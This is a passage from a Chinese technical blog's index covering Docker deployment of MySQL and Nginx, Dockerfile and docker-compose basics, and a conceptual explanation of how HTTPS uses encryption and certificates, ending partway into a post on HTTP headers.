mysql</span><br></pre></td></tr></table></figure><p>参数说明：</p></li></ol><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-p 3306:3306</td><td>将容器的3306端口映射到宿主机的3306端口</td></tr><tr><td>-v $PWD/conf:/etc/mysql/conf.d</td><td>将主机当前目录下的conf/my.cnf挂载到容器的/etc/mysql/my.cnf。配置目录</td></tr><tr><td>-v $PWD/logs:/logs</td><td>将主机当前目录下的logs目录挂载到容器的logs。日志目录</td></tr><tr><td>-v $PWD/data:/var/lib/mysql</td><td>将主机当前目录下的data目录挂载到容器的/var/lib/mysql。数据目录</td></tr><tr><td>-e MYSQL_ROOT_PASSWORD=root</td><td>初始化root用户的密码。</td></tr></tbody></table><ol start="4"><li>通过宿主机或者外部机器中的mysql客户端，操作mysql。</li></ol><h2 id="Nginx部署"><a href="#Nginx部署" class="headerlink" title="Nginx部署"></a>Nginx部署</h2><p>在docker容器中部署Nginx，并通过外部机器访问Nginx。</p><h4 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h4><ol><li><p>搜索Nginx镜像。</p></li><li><p>拉取Nginx镜像。</p></li><li><p>创建容器。</p><p>首先创建nginx目录，方便之后的管理。</p><p>创建conf目录，进入创建nginx.conf文件，粘贴下面内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line">#error_log  logs&#x2F;error.log;</span><br><span class="line">#error_log  logs&#x2F;error.log  notice;</span><br><span class="line">#error_log  logs&#x2F;error.log  info;</span><br><span class="line">#pid        logs&#x2F;nginx.pid;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line">#log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">    #                  &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">    #                  &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line">#access_log  logs&#x2F;access.log  main;</span><br><span class="line">sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line">#keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  650;</span><br><span class="line">        client_max_body_size 20m;</span><br><span class="line">        proxy_connect_timeout     300; </span><br><span class="line">        proxy_read_timeout      300; </span><br><span class="line">        proxy_send_timeout      300;</span><br><span class="line">#gzip  on;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">#charset koi8-r;</span><br><span class="line">#access_log  logs&#x2F;host.access.log  main;</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">#error_page  404              &#x2F;404.html;</span><br><span class="line"># redirect server error pages to the static page &#x2F;50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">        location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"># proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    proxy_pass   http:&#x2F;&#x2F;127.0.0.1;</span><br><span class="line">        #&#125;</span><br><span class="line"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">            root           html;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">                        fastcgi_read_timeout 300;</span><br><span class="line">            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; </span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"># deny access to .htaccess files, if Apache&#39;s document root</span><br><span class="line">        # concurs with nginx&#39;s one</span><br><span class="line">        #</span><br><span class="line">        #location ~ &#x2F;\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line"># another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line">#    location &#x2F; &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"># HTTPS server</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       443 ssl;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line">#    ssl_certificate      cert.pem;</span><br><span class="line">    #    ssl_certificate_key  cert.key;</span><br><span class="line">#    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    #    ssl_session_timeout  5m;</span><br><span class="line">#    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    #    ssl_prefer_server_ciphers  on;</span><br><span class="line">#    location &#x2F; &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line">    include vhosts&#x2F;*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启docker容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Docker run -id --name=d_nginx -p 80:80 -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/var/log/nginx -v $PWD/html:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1></li><li><p>Docker镜像的本质是什么？</p><p>Docker镜像的本质是分层的文件系统。</p></li><li><p>Docker中一个centos镜像为什么只要200MB，而一个centos操作系统的ISO文件要几个G？</p><p>centos的iso镜像文件包含bootfs和rootfs，而docker的centos镜像不用操作系统的bootfs，只有rootfs和其他镜像层。</p></li><li><p>Docker中一个tomcat镜像为什么有500MB，而一个tomcat安装包只要70多MB？</p><p>由于docker中镜像是分层的，tomcat虽然只有70MB，但他需要依赖于父镜像和基础镜像，所有整个对外暴露的tomcat镜像大小就是500MB。</p></li></ol><p><strong>操作系统组成部分：</strong></p><ul><li>进程调度子系统</li><li>进程通信子系统</li><li>内存管理子系统</li><li>设备管理子系统</li><li>文件管理子系统</li><li>网络通信子系统</li><li>作业控制子系统</li></ul><h4 id="文件管理子系统"><a href="#文件管理子系统" class="headerlink" title="文件管理子系统"></a>文件管理子系统</h4><p>linux文件系统由bootfs和rootfs两部分组成。</p><p>bootfs：包含bootloader（引导加载程序）和kernel（内核）。</p><p>rootfs：root文件系统，包含的就是典型linux系统中的/dev，/proc，/bin，/etc等标准目录和文件。</p><p>不同的linux发行版，bootfs基本相同，而rootfs不同，如ubuntu、centos等。</p><h2 id="Docker镜像原理"><a href="#Docker镜像原理" class="headerlink" title="Docker镜像原理"></a>Docker镜像原理</h2><p>docker镜像是由特殊的文件系统叠加而成。</p><p>最底端是bootfs，并使用宿主机的bootfs。</p><p>第二层是root文件系统rootfs，称为base image。</p><p>然后再往上可以叠加其他的镜像文件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323212355.png"></p><p>统一文件系统（UNION File System）技术能够将不同的层整合成一个文件系统，为这些层提供了一个统一的视角，这样就隐藏了多层的存在，在用户的角度看来，只存在一个文件系统。</p><p>一个镜像可以放在另一个镜像的上面。位于下面的镜像称为父镜像，最底部的镜像称为基础镜像。</p><p>当一个镜像启动容器时，docker会在最顶层加载一个读写文件系统作为容器。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323212437.png"></p><h2 id="镜像制作"><a href="#镜像制作" class="headerlink" title="镜像制作"></a>镜像制作</h2><p>Docker下有两种方法来制作镜像。</p><h3 id="容器转镜像"><a href="#容器转镜像" class="headerlink" title="容器转镜像"></a>容器转镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker commit 容器id 镜像名:版本号</span><br><span class="line">docker save -o 压缩文件名称 镜像文件:版本号</span><br><span class="line">docker load -i 压缩文件名字</span><br></pre></td></tr></table></figure><p>以上前两条命令可以将docker容器打包成镜像，并保存成压缩文件。第三条命令可以将压缩文件重新载入到docker中，生成镜像。</p><p>commit命令在将容器打包成镜像时，若该容器有数据卷，数据卷中的内容不会打包到镜像中。</p><h3 id="Dockerfile文件"><a href="#Dockerfile文件" class="headerlink" title="Dockerfile文件"></a>Dockerfile文件</h3><p>dockerfile是一个文本文件，包含了一条条的指令。每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像</p><p>对于开发人员：可以为开发团队提供一个完全一致的开发环境</p><p>对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件构建一个新的镜像开始工作。</p><p>对于运维人员：在部署时，可以实现应用的无缝移植。</p><h4 id="Dockerfile文件中的关键字"><a href="#Dockerfile文件中的关键字" class="headerlink" title="Dockerfile文件中的关键字"></a>Dockerfile文件中的关键字</h4><table><thead><tr><th>关键字</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>FROM</td><td>指定父镜像</td><td>指定dockerfile基于哪个image构建</td></tr><tr><td>MAINTAINER</td><td>作者信息</td><td>用来标明这个dockerfile谁写的</td></tr><tr><td>LABEL</td><td>标签</td><td>用来表名dockerfile的标签，可以使用Label代替Maintainer最终都是在docker image基本信息中可以查看</td></tr><tr><td>RUN</td><td>执行命令</td><td>执行一段命令，默认是/bin/sh，格式：RUN command或者RUN  [“command”,”param1”,”param2”]</td></tr><tr><td>CMD</td><td>容器启动命令</td><td>提供启动容器时候的默认命令和ENTRYPOINT配合使用。格式 CMD command param1 param2或者CMD  [“command”,”param1”,”param2”]</td></tr><tr><td>ENTRYPOINT</td><td>入口</td><td>一般在制作一些执行就关闭的容器中会使用</td></tr><tr><td>COPY</td><td>复制文件</td><td>build的时候复制文件到image中</td></tr><tr><td>ADD</td><td>添加文件</td><td>build的时候添加文件到image中，不仅仅局限于当前build上下文，可以来源于远程服务</td></tr><tr><td>ENV</td><td>环境变量</td><td>指定build时候的环境变量，可以在启动容器的时候通过-e覆盖，格式ENV  name=value</td></tr><tr><td>ARG</td><td>构建参数</td><td>构建参数，只在构建的时候使用的参数，如果有ENV，那么ENV的相同名字的值始终覆盖arg的参数</td></tr><tr><td>VOLUNE</td><td>定意外不可以挂载的数据卷</td><td>指定build的image哪些目录可以启动时候挂载到文件系统中，启动容器的时候使用-v绑定。格式 VOLUME  [“目录”]</td></tr><tr><td>EXPOSE</td><td>暴露端口</td><td>定义容器运行的时候监听的端口，启动容器的时候使用-p来绑定暴露端口。格式  EXPOSE 8080 或者 EXPOSE 8080/udp</td></tr><tr><td>WORKDIR</td><td>工作目录</td><td>指定容器内部的工作目录，如果没有创建则自动创建，如果指定/使用的是绝对地址，如果不是/开头，那么实在上一天workdir的路径的相对路径</td></tr><tr><td>USER</td><td>指定执行用户</td><td>指定build或者启动的时候，用户在RUN CMD ENTRYPOINT执行的时候的用户</td></tr><tr><td>HEALTHCHECK</td><td>健康检查</td><td>指定监测当前容器的健康监测的命令，基本上没用，因为很多时候，应用本身有健康监测机制。</td></tr><tr><td>ONBUILD</td><td>触发器</td><td>当存在ONBUILD关键字的镜像作为基础镜像的时候，当执行FROM完成之后，会执行ONBUILD的命令，但是不影响当前镜像，用处也不怎么搭</td></tr><tr><td>STOPSIGNAL</td><td>发送信号量到宿主机</td><td>该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。</td></tr><tr><td>SHELL</td><td>指定执行脚本的shell</td><td>指定RUN  CMD ENTRYPOINT执行命令时候使用的shell</td></tr></tbody></table><h4 id="dockerfile案例"><a href="#dockerfile案例" class="headerlink" title="dockerfile案例"></a>dockerfile案例</h4><p>需求：自定义一个centos7镜像，设置默认工作路径为/usr，安装net-tools、vim。</p><p>dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> <span class="number">0</span>pt1mus &lt;xxxxx@xx.com&gt;</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum install -y vim net-tools</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /usr</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br></pre></td></tr></table></figure><p>在dockerfile文件所在的目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Docker build -f ./centos_dockerfile -t superj_centos:1 .</span><br></pre></td></tr></table></figure><p>最后的<code>.</code>是告诉docker在build时候的上下文环境是当前目录。</p><p>由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p><p>如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。</p><p><strong>注意</strong>：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p><h1 id="Docker服务编排"><a href="#Docker服务编排" class="headerlink" title="Docker服务编排"></a>Docker服务编排</h1><p>服务编排：按照一定的业务规则批量管理容器。</p><p>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停，维护的工作量会很大。</p><ul><li>要从dockerfile build     image或者去dockerhub拉取image</li><li>要创建多个container</li><li>要管理这些container（启动停止删除）</li></ul><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p><code>Docker compose</code>是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建，启动和停止。</p><p>使用步骤：</p><ol><li>利用dockerfile定义运行环境镜像</li><li>使用docker-compose.yml定义组成应用的各个服务</li><li>运行docker-compose up启动应用</li></ol><p>在MAC的环境下，用<code>homebrew</code>安装Docker后，<code>docker compose</code>已默认安装，可直接使用。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>使用docker compose编排nginx+springboot项目</p><ol><li><p>创建docker-compose目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir docker-compose</span><br><span class="line">cd docker-compose</span><br></pre></td></tr></table></figure></li><li><p>编写docker-compose.yml文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./nginx/conf.d:/etc/nginx/conf.d</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">expose:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8080&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>创建./nginx/conf.d目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p nginx/conf.d</span><br></pre></td></tr></table></figure></li><li><p>在./nginx/conf.d目录下编写nginx.conf文件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"><span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://app:8080;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在docker-compose目录下使用docker-compose启动容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure></li><li><p>测试访问。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解(七)——确保web安全的HTTPS</title>
      <link href="2020/03/23/20200323162450/"/>
      <url>2020/03/23/20200323162450/</url>
      
        <content type="html"><![CDATA[<p>在HTTP协议中有可能存在信息窃听或身份伪装等安全问题。使用HTTPS通信机制可以有效地防止这些问题。</p><h1 id="HTTP的缺点"><a href="#HTTP的缺点" class="headerlink" title="HTTP的缺点"></a>HTTP的缺点</h1><p>HTTP主要有这些不足：</p><ul><li>通信使用明文（不加密），内容可能会被窃听</li><li>不验证通信方的身份，因此有可能遭遇伪装</li><li>无法证明报文的完整性，所以有可能已遭篡改</li></ul><h3 id="通信使用明文可能会被窃听"><a href="#通信使用明文可能会被窃听" class="headerlink" title="通信使用明文可能会被窃听"></a>通信使用明文可能会被窃听</h3><ul><li><p>TCP/IP是可能被窃听的网络</p><p>监听相同段上的通信并非难事。只需要手机在互联网上流动的数据包（帧）就行了。</p></li><li><p>加密处理防止被窃听</p><p>加密的对象可以有这么几个：</p><p><strong>通信的加密。</strong>一种方式就是将通信加密。HTTP协议中没有加密机制，但可以通过和SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用，加密HTTP的通信内容。</p><p>用SSL建立安全通信线路之后，就可以在这条线路上进行HTTP通信了。与SSL组合使用的HTTP被称为HTTPS（HTTP Secure，超文本传输安全协议）或HTTP over SSL。</p><p><strong>内容的加密。</strong>还有一种将参与通信的内容本身加密的方式。由于HTTP协议中没有加密机制，那么就对HTTP协议传输的内容本身加密。即把HTTP报文里所含的内容进行加密处理。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323163144.png"></p><p>有一点要引起注意，由于该方式不同于SSL或TLS将整个通信线路加密处理，所以内容任然有被篡改的风险。</p></li></ul><h3 id="不验证通信方的身份就可能遭遇伪装"><a href="#不验证通信方的身份就可能遭遇伪装" class="headerlink" title="不验证通信方的身份就可能遭遇伪装"></a>不验证通信方的身份就可能遭遇伪装</h3><p>HTTP协议中的请求和响应不会对通信方进行确认。</p><ul><li><p>任何人都可发起请求</p><p>在HTTP协议通信时，由于不存在确认通信方的处理步骤，任何人都可以发起请求。另外，服务器只要接收到请求，不管对方是谁都会返回一个响应（但也仅限于发送端的IP地址和端口号没有被Web服务器设定限制访问的前提下）。</p><p>不确认通信方，会存在以下各种隐患：</p><p>无法确定返回响应的Web服务器是真正的服务器</p><p>无法确定接收响应的客户端是真正的客户端</p><p>无法确定正在通信的对方是否具备访问权限。</p><p>无法判定请求是来自何方、出自谁手。</p><p>即使无意义的请求也照单全收。DoS（Denial of Service，拒绝服务攻击）。</p></li><li><p>查明对手的证书</p><p>HTTP协议无法确定通信方，但使用SSL则可以。SSL不仅提供加密处理，而且还使用了一种被称为证书（证书是第三方颁发的，从技术手段上是很难伪造的）的手段，可用于确定方。</p></li></ul><h3 id="无法证明报文完整性，可能已遭篡改"><a href="#无法证明报文完整性，可能已遭篡改" class="headerlink" title="无法证明报文完整性，可能已遭篡改"></a>无法证明报文完整性，可能已遭篡改</h3><p>所谓完整性是指信息的准确度。若无法证明其完整性，通常也就意味着无法判断信息是否准确。</p><ul><li>接收到的内容可能有误</li><li>如何防止篡改</li></ul><p>常用的MD5和SHA-1等散列值校验的方法，以及用来确认文件的数字签名方法。</p><h1 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护=HTTPS"></a>HTTP+加密+认证+完整性保护=HTTPS</h1><p>HTTP加上加密处理和认证以及完整性保护后即是HTTPS。</p><h3 id="HTTPS是身披SSL外壳的HTTP"><a href="#HTTPS是身披SSL外壳的HTTP" class="headerlink" title="HTTPS是身披SSL外壳的HTTP"></a>HTTPS是身披SSL外壳的HTTP</h3><p>HTTPS并非是应用层的一种新协议。只是HTTP通信接口部分用SSL（Secure Socket Layer）和TLS（Transport Layer Security）协议代替而已。</p><p>通常，HTTP直接和TCP通信。当使用SSL时，则演变成先和SSL通信，再由SSL和TCP通信了。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323163420.png"></p><p>SSL是当今世界上应用最为广泛的网络安全技术。</p><h3 id="相互交换密钥的公开密钥加密技术"><a href="#相互交换密钥的公开密钥加密技术" class="headerlink" title="相互交换密钥的公开密钥加密技术"></a>相互交换密钥的公开密钥加密技术</h3><p>SSL采用一种叫做公开密钥加密（Public-key cryptography）的加密方式。</p><p>HTTPS采用混合加密机制。HTTPS采用共享密钥加密和公开密钥加密两者并用的混合加密机制。</p><h3 id="证明公开密钥正确性的证书"><a href="#证明公开密钥正确性的证书" class="headerlink" title="证明公开密钥正确性的证书"></a>证明公开密钥正确性的证书</h3><p>公开密钥加密方式还是存在一些问题的。那就是无法证明公开密钥本身就是货真价实的公开密钥。</p><p>为了解决上述问题，可以使用由数字证书认证机构（CA，Certificate Authority）和其相关机关颁发的公开密钥证书。</p><p>数字证书认证机构的业务流程。首先，服务器的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。</p><p>此处认证机关的公开密钥必须安全地转交给客户端。使用通信方式时，如何安全转交是一件很困难的事，因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323163522.png"></p><h3 id="HTTPS的安全通信机制"><a href="#HTTPS的安全通信机制" class="headerlink" title="HTTPS的安全通信机制"></a>HTTPS的安全通信机制</h3><p>粗粒度的讲解HTTPS的非对称和对称加解密过程（这里是443通信的过程）：</p><ol><li>客户端浏览器发起连接，告知自己支持的加密算法和摘要算法等信息。</li><li>WEB服务器将确定的加密算法、摘要算法、公钥、域名信息等发给客户端。</li><li>客户端生成一个session key，并且将session key用公钥加密后发送给服务器。</li><li>服务器用私钥将session key解密出来。</li><li>客户端和服务器用session key做对称加密通信。</li></ol><p>在上面第二步将服务器公钥发送给客户端的时候，如果有中间人拦截这一数据，并将传送的公钥改为自己的公钥发送给客户端。客户端并不知道消息被篡改，认为接受的公钥就是服务器的公钥，因此通过接受到的公钥加密session key，传送给服务器，又被中间人拦截，这时，攻击者就可以得到session key，之后传递的http信息也会被中间人所查看。因此，在传送公钥的过程中，要保证公钥的正确性。</p><p>第二步具体的通信过程为：</p><ol><li>首先生成消息，包含确定的加密、摘要算法、服务端公钥、域名信息等。</li><li>服务器通过信息摘要，向CA机构申请签名证书。</li><li>服务器将信息和证书发送给服务端。</li><li>客户端验证证书，提取公钥。</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323163540.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP详解(六)——HTTP首部</title>
      <link href="2020/03/13/20200313221726/"/>
      <url>2020/03/13/20200313221726/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP报文首部"><a href="#HTTP报文首部" class="headerlink" title="HTTP报文首部"></a>HTTP报文首部</h1><p>在请求中，HTTP报文由方法、URI、HTTP版本、HTTP首部字段等部分构成。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313221839.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313221855.png"></p><p>在响应中，HTTP报文由HTTP版本、状态码（数字和原因短语）、HTTP首部字段3部分构成。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313221927.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313221936.png"></p><h1 id="HTTP首部字段"><a href="#HTTP首部字段" class="headerlink" title="HTTP首部字段"></a>HTTP首部字段</h1><h3 id="HTTP首部字段传递重要信息"><a href="#HTTP首部字段传递重要信息" class="headerlink" title="HTTP首部字段传递重要信息"></a>HTTP首部字段传递重要信息</h3><p>HTTP首部字段是构成HTTP报文的要素之一。在客户端与服务器之间以HTTP协议进行通信的过程中，无论是请求还是响应都会使用首部字段，它能起到传递额外重要信息的作用。</p><p>使用首部字段是为了给浏览器和服务器提供报文主体大小、所使用的语言、认证信息等内容。</p><h3 id="HTTP首部字段结构"><a href="#HTTP首部字段结构" class="headerlink" title="HTTP首部字段结构"></a>HTTP首部字段结构</h3><p>HTTP首部字段是由首部字段名和字段值构成的，中间用冒号分割。</p><p>比如，报文主体的对象类型：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313222047.png"></p><p>字段值对应单个HTTP首部字段可以有多个值：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200313222110.png"></p><h3 id="4种HTTP首部字段类型"><a href="#4种HTTP首部字段类型" class="headerlink" title="4种HTTP首部字段类型"></a>4种HTTP首部字段类型</h3><p>根据实际用途被分为以下4种类型</p><ul><li><p>通用首部字段（General Header Fields）</p><p>请求报文和响应报文都会使用的首部</p></li><li><p>请求首部字段（Request Header Fields）</p><p>从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</p></li><li><p>响应首部字段（Response Header Fields）</p><p>从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</p></li><li><p>实体首部字段（Entity Header Fields）</p><p>针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。</p></li></ul><h3 